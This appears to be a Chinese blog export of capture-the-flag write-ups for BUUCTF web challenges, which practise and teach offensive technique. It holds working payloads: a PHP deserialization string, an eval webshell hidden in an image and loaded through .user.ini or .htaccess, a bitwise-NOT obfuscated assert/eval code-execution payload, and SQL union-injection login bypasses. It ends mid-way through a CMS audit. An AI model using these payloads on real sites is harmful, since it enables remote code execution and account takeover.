<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo</span><br><span class="line"></span><br><span class="line">解码后</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>再看看password变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br></pre></td></tr></table></figure>
<p>这里用了反序列化，所以password就是序列化后的值</p>
<p>利用<code>useless.php</code>构造序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span> ;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>运行后        </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  </span><br></pre></td></tr></table></figure>

<p>最后payload</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:&quot;Flag&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;file&quot;;s:<span class="number">8</span>:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">//仔细一下会注意到这里的file的值中，伪协议删除了，</span><br><span class="line">这是因为开始默认都是<span class="keyword">index</span>.php，但是<span class="keyword">index</span>.php没有Flag类，</span><br><span class="line">如果想执行反序列化，那就需要包含Flag类，也就是这里的useless.php里的</span><br><span class="line">所以这里删除file里的伪协议，只留useless.php的文件名</span><br><span class="line">就是利用  <span class="keyword">include</span>($file); </span><br><span class="line">把useless.php包含在<span class="keyword">index</span>.php里，从而可以成功执行反序列化，得到flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="9-SUCTF-2019-CheckIn"><a href="#9-SUCTF-2019-CheckIn" class="headerlink" title="9.[SUCTF 2019]CheckIn"></a>9.[SUCTF 2019]CheckIn</h2><h3 id="1-题目描述-6"><a href="#1-题目描述-6" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>先上传一个文本文件试试</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825173012665.png" alt="image-20220825173012665"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">exif_imagetype是判断一个图像的类型的进程。</span><br></pre></td></tr></table></figure>

<p>所以只能上传图片</p>
<p>先上传一个包含PHP木马的图片马试试</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825174837632.png" alt="image-20220825174837632"></p>
<p>看来是过滤了<code>&lt;?</code>，所以除了php,其他的asp,aspx,jsp,js都可以绕过</p>
<p>这里以js举例</p>
<p>创建一个js文件，内容为</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>在和一个普通图片合成，也可以加个文件头GIF89a</p>
<p>图片马名为<code>haha.gif</code></p>
<p>然后上传</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825210858681.png" alt="image-20220825210858681"></p>
<p>由于不是php木马，所以无法用<code>.htaccess</code>文件绕过</p>
<p>这里就需要用<code>.user.ini</code>配置文件,当然使用前提是<code>.user.ini</code>文件下有php文件，不然也不能包含了</p>
<p>推荐看一下这篇<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
<p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>
<p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>
<p> <strong>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure>

<p>所以这里设置自动包含的文件为<code>haha.gif</code></p>
<p>于是<code>.user.ini</code>内容为</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">GIF89a       <span class="comment">//绕过图片判断         </span></span><br><span class="line"><span class="built_in">auto</span>_prepend_file=haha.gif</span><br></pre></td></tr></table></figure>

<p>上传<code>.user.ini</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825214029074.png" alt="image-20220825214029074"></p>
<p>这个时候haha.gif就已经包含在index.php，可以访问</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">9</span>c7a4b64-<span class="number">1</span>c49-<span class="number">4</span>ee4-a146-dc6763b5ce1c.node4.buuoj.cn:<span class="number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><br></pre></td></tr></table></figure>

<p>能看到<code>GIF98a?</code></p>
<p>然后也可以用hackbar，post上传命令，如图中的phpinfo()</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215617387.png" alt="image-20220825215617387"></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(scandir(<span class="string">&quot;/&quot;</span>))<span class="comment">;//看看根目录，找到flag</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220825220933577.png" alt="image-20220825220933577"></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(file_get_contents(<span class="string">&quot;/flag&quot;</span>))<span class="comment">;//读取flag文件</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220825221229971.png" alt="image-20220825221229971"></p>
<hr>
<p>当然用蚁剑最简单，连接也成功</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825214728996.png" alt="image-20220825214728996"></p>
<p>可以看到<strong>index.php文件也在上传的目录</strong>下，也就是<code>.user.ini</code>的同一个目录下，所以才可以成功包含</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215454619.png" alt="image-20220825215454619"></p>
<p>在根目录发现了flag，打开即可得到flag</p>
<hr>
<p>但我发现根目录一个clean.sh文件，这是一个定时清空linux服务器上缓存的文件脚本，上传的文件会被定时删除</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215047906.png" alt="image-20220825215047906"></p>
<p>这是一分钟左右后，靶场环境还在但是无法访问了，所以要快点拿取flag</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215220524.png" alt="image-20220825215220524"></p>
<p>这里本来想删掉clean.sh，发现没权限，无法执行，sudo也不行，那就只能速战速决了</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825220024393.png" alt="image-20220825220024393"></p>
<p>根目录得到flag</p>
<h2 id="10-GXYCTF2019-BabyUpload"><a href="#10-GXYCTF2019-BabyUpload" class="headerlink" title="10.[GXYCTF2019]BabyUpload"></a>10.[GXYCTF2019]BabyUpload</h2><h3 id="1-题目描述-7"><a href="#1-题目描述-7" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题不难，但是开始不清楚还是不知道过滤了什么，</p>
<p>这道题介绍几个点就可以了</p>
<p>第一个是过滤了后缀名含ph</p>
<p>第二也是关键的，它只允许上传<code>content-type: image/jpeg</code>，png和gif都不可以</p>
<p>第三点就是它过滤了文件内容里含<code>&lt;?</code></p>
<p>所以上传一个jpeg文件，抓包修改内容为非php但包含php的一个脚本，</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="meta">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>再上传.htaccess文件，解析所有文件为php</p>
<p>用蚁剑连接jpeg文件，即可</p>
<h2 id="11-极客大挑战-2019-RCE-ME"><a href="#11-极客大挑战-2019-RCE-ME" class="headerlink" title="11.[极客大挑战 2019]RCE ME"></a>11.[极客大挑战 2019]RCE ME</h2><h3 id="1-题目描述-8"><a href="#1-题目描述-8" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>先对代码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到code被正则匹配，所以字母大小写和数字都不能输入</p>
<p>这里就学到新东西了</p>
<p><strong>取反绕过</strong></p>
<p><u><strong>取反</strong>就是将数字转化为二进制,再把二进制中的1变成0,0变成1</u></p>
<p><code>~</code>是取反符号，</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br><span class="line"></span><br><span class="line"><span class="comment">//php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</span></span><br></pre></td></tr></table></figure>

<p>然后再赋值</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);</span><br><span class="line"></span><br><span class="line"><span class="comment">//注意后面要有；，代表php代码结束</span></span><br><span class="line"><span class="comment">//这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反</span></span><br><span class="line"></span><br><span class="line">等同于</span><br><span class="line"></span><br><span class="line">?code=(assert)(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]));</span><br><span class="line"></span><br><span class="line">(assert)因为是assert是函数，被当作函数执行，于是因为断言(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]))，所以把<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>])当作php执行，于是就可以拿到shell了</span><br></pre></td></tr></table></figure>



<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">蚁剑连接</span><br><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>但是发现flag是空的</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181221552.png" alt="image-20220903181221552"></p>
<p>看了其他大佬的wp才知道，需要蚁剑插件<code>disable_functions</code>，禁止网站的函数，防止其阻止读取flag</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181348649.png" alt="image-20220903181348649"></p>
<p>再在主页右键</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181431745.png" alt="image-20220903181431745"></p>
<p>模式选择</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181451266.png" alt="image-20220903181451266"></p>
<p>然后点击开始</p>
<p>终端输入</p>
<p><code>/readflag</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181528195.png" alt="image-20220903181528195"></p>
<p>得到flag</p>
<h2 id="12-GXYCTF2019-BabySQli"><a href="#12-GXYCTF2019-BabySQli" class="headerlink" title="12.[GXYCTF2019]BabySQli"></a>12.[GXYCTF2019]BabySQli</h2><h3 id="1-题目描述-9"><a href="#1-题目描述-9" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始是一个登录框</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909203922998.png" alt="image-20220909203922998"></p>
<p>我们随便输入一个账号密码</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">账号：<span class="literal">admin</span></span><br><span class="line">密码：<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220909204018695.png" alt="image-20220909204018695"></p>
<p>报错，看来用户名没错，密码错误</p>
<p>查看源码看看</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204046072.png" alt="image-20220909204046072"></p>
<p>发现有一串加密字符，看起来像base</p>
<p>先用<code>base32</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204202994.png" alt="image-20220909204202994"></p>
<p>看起来就是<code>base32+base64</code>混合编码，再用<code>base64</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204325138.png" alt="image-20220909204325138"></p>
<hr>
<p>当然看不出来，直接无脑<code>ciphey</code>，也可以，当然还是需要了解不同编码和加密字符的特点</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204746167.png" alt="image-20220909204746167"></p>
<p>也可以得到解码结果</p>
<hr>
<p>由</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可知，sql注入点在Username处，且为单引号闭合</p>
<p>于是我们尝构造注入</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>and%<span class="number">201</span>=<span class="number">1</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220909205630033.png" alt="image-20220909205630033"></p>
<p>发现有的字符被过滤了，我们可以用fuzz爆破测试看看，也可以一个一个试</p>
<p>我这里先爆破试试（建议爆破还是慢一些，后面直接太多请求，服务器不发返回包了）</p>
<p>大概统计一下</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">or</span><br><span class="line">()</span><br><span class="line"><span class="operator">=</span></span><br></pre></td></tr></table></figure>

<p>所以我们只有先试试联合注入</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">由于过滤了or</span><br><span class="line">所以我们不能使用<span class="keyword">order</span> <span class="keyword">by</span>来判断列数，可以用联合注入，利用<span class="keyword">select</span>的结果来判断</span><br></pre></td></tr></table></figure>

<p>先试试<code>select 1,2</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220909214254664.png" alt="image-20220909214254664"></p>
<p>发现报错，列数有问题</p>
<p>再试试<code>select 1,2,3</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220909214345515.png" alt="image-20220909214345515"></p>
<p>发现虽然没有报错，但是也没有直接回显</p>
<p>再试试<code>select 1,2,3,4</code></p>
<p>又报错</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909214506605.png" alt="image-20220909214506605"></p>
<p><strong>所以得出<code>列数一共有3列</code></strong></p>
<p><strong>根据经验这三列，分别是</strong><u><strong>id,username,password</strong></u></p>
<p>我们可以用以下语句进行确认</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="built_in">select</span>%<span class="number">20</span>”admin“,<span class="number">2</span>,<span class="number">3</span><span class="meta">#&amp;pw=123456   </span></span><br><span class="line"><span class="comment">//把第一位，即1的位置换成用户名admin</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220910085003536.png" alt="image-20220910085003536"></p>
<p>提示用户名错误，看来用户名不在第一位</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">name<span class="operator">=</span><span class="number">-1</span>&#x27;<span class="variable">%20</span>union<span class="variable">%20</span><span class="keyword">select</span><span class="variable">%201</span><span class="punctuation">,</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="number">3</span>#&amp;pw<span class="operator">=</span><span class="number">123456</span></span><br><span class="line">//把第二位，即<span class="number">2</span>的位置换成用户名admin</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220910085115686.png" alt="image-20220910085115686"></p>
<p>提示密码错误，看来用户名回显就在第二位</p>
<p><strong>但是没有回显我们select的数据，可是如果用报错注入和盲注的话，()被过滤了，也不能用</strong></p>
<p>所以我们只有考虑，怎么才可以登录上去</p>
<p>首先这是一个sql注入的题目，密码不可能简单的爆破就可以解决</p>
<p><strong>密码肯定是进行加密，最常见的密码加密就是md5</strong>，所以我们利用<code>md()</code>函数把我们的密码加密，再加上我们的用户名一起导入到题目的数据库里，即可完成登录</p>
<p>注意因为<code>()</code>被过滤，所以只能先把密码进行md5加密，在导入，而不能直接用函数</p>
<hr>
<p>这里又有一个新的知识点</p>
<p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。【union select】</strong></p>
<p>在<code>Web-study</code>里写的详细</p>
<p>下面简单说一下流程</p>
<p>先把我们的密码123456利用md5加密</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220910090640990.png" alt="image-20220910090640990"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure>

<p>然后构造payload</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="keyword">select</span>%<span class="number">201</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>#&amp;pw=<span class="number">123456</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">联合注入的技巧，就是在使用<span class="built_in">union</span> <span class="keyword">select</span>时候，后面的数据如果不存在，就会生成一个虚拟的数据</span><br><span class="line">如上面的</span><br><span class="line"></span><br><span class="line">根据上面base编码结果，<span class="keyword">select</span> * <span class="keyword">from</span> user <span class="built_in">where</span> username = &#x27;$name&#x27;</span><br><span class="line"></span><br><span class="line">我们利用<span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span></span><br><span class="line"></span><br><span class="line">因为user表里不存在id=<span class="number">1</span>,username=admin,password=e10adc3949ba59abbe56e057f20f883e</span><br><span class="line"></span><br><span class="line">所以会生成一个一个数据插入表中</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">当name参数进行sql注入，把数据插入user表中时</span><br><span class="line">后面password只要和明文一样，即可登录成功</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220910091405613.png" alt="image-20220910091405613"></p>
<p>得到flag</p>
<h2 id="13-护网杯-2018-easy-tornado"><a href="#13-护网杯-2018-easy-tornado" class="headerlink" title="13.[护网杯 2018]easy_tornado"></a>13.[护网杯 2018]easy_tornado</h2><h3 id="1-题目描述-10"><a href="#1-题目描述-10" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>线上靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试</title>
    <url>/2022/11/22/SYC/</url>
    <content><![CDATA[<p><code>训练一下自己的代码审计能力，了解一些开源框架的漏洞形成原因，并自己尝试复现</code></p>
<span id="more"></span>

<h1 id="漫城CMS-v2-5-8漏洞分析"><a href="#漫城CMS-v2-5-8漏洞分析" class="headerlink" title="漫城CMS v2.5.8漏洞分析"></a>漫城CMS v2.5.8漏洞分析</h1><h2 id="环境搭建phpstudy"><a href="#环境搭建phpstudy" class="headerlink" title="环境搭建phpstudy"></a>环境搭建<code>phpstudy</code></h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Apache</span> <span class="number">2</span>.<span class="number">4</span>.<span class="number">43</span></span><br><span class="line"><span class="attribute">MySQL</span> <span class="number">8</span>.<span class="number">0</span>.<span class="number">12</span></span><br><span class="line"><span class="attribute">php</span> <span class="number">7</span>.<span class="number">3</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure>

<h3 id="管理员页面"><a href="#管理员页面" class="headerlink" title="管理员页面"></a>管理员页面</h3><p><img src="/2022/11/22/SYC/image-20221122144520325.png" alt="image-20221122144520325"></p>
<h3 id="主页"><a href="#主页" class="headerlink" title="主页"></a>主页</h3><p><img src="/2022/11/22/SYC/image-20221122144602259.png" alt="image-20221122144602259"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="官方文档信息"><a href="#官方文档信息" class="headerlink" title="官方文档信息"></a>官方文档信息</h3><p>整体目录结构</p>
<p>如下（大致猜测漏洞出现位置）：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">│─attachment <span class="regexp">//</span>附件目录</span><br><span class="line">│─caches  <span class="regexp">//</span>缓存目录</span><br><span class="line">│─packs <span class="regexp">//</span>静态文件目录</span><br><span class="line">│─rewrite <span class="regexp">//</span>伪静态文件目录</span><br><span class="line">│─sys <span class="regexp">//</span>系统核心目录</span><br><span class="line">│  │─apps <span class="regexp">//</span>应用目录</span><br><span class="line">│  │─class <span class="regexp">//</span>第三方库类目录【可能存在】</span><br><span class="line">│  │─errors <span class="regexp">//</span>系统错误提示目录</span><br><span class="line">│  │─libs <span class="regexp">//</span>系统常量配置目录</span><br><span class="line">│  │─system <span class="regexp">//</span>CI框架目录</span><br><span class="line">│─template <span class="regexp">//</span>模板目录【可能存在】</span><br><span class="line">│  │─admin <span class="regexp">//</span>后台模板</span><br><span class="line">│  │─install <span class="regexp">//</span>系统安装模板</span><br><span class="line">│  │─pc <span class="regexp">//</span>前台PC端模版</span><br><span class="line">│  │─wap <span class="regexp">//</span>前台手机模版</span><br><span class="line">│─admin.php <span class="regexp">//</span>后台入口文件（为了安全起见，请修改文件名）【可能存在】</span><br><span class="line">└─index.php <span class="regexp">//</span>入口文件【可能存在】</span><br></pre></td></tr></table></figure>

<h3 id="模板目录结构"><a href="#模板目录结构" class="headerlink" title="模板目录结构"></a>模板目录结构</h3><p>系统模板系统放在&#x2F;template&#x2F;目录下。在后台站点设置中，可以选择当前使用的模板</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">│─template/[<span class="keyword">pc</span>/wap]/<span class="number">1</span>/ 模板<span class="number">1</span></span><br><span class="line">│ ├─js js文件</span><br><span class="line">│ ├─css css文件</span><br><span class="line">│ ├─images 图片文件</span><br><span class="line">│ ├─html 模板文件目录（该目录名可以随意修改，注意tpl.php也有需要同时修改）</span><br><span class="line">│ │  │─custom 自定义模板目录</span><br><span class="line">│ │  │─author 作者中心目录</span><br><span class="line">│ │  │  │─packs.html 样式模版</span><br><span class="line">│ │  │  │─head.html 模板头部文件</span><br><span class="line">│ │  │  │─bottom.html 模板底部文件</span><br><span class="line">│ │  │  │─<span class="keyword">left</span>.html 模板左部文件</span><br><span class="line">│ │  │  │─<span class="keyword">right</span>.html 模板右部文件</span><br><span class="line">│ │  │  │─chapter.html 章节列表模版</span><br><span class="line">│ │  │  │─chapter_add.html 新增章节模版</span><br><span class="line">│ │  │  │─chapter_edit.html 修改章节模版</span><br><span class="line">│ │  │  │─comic.html 漫画列表模版</span><br><span class="line">│ │  │  │─comic_add.html 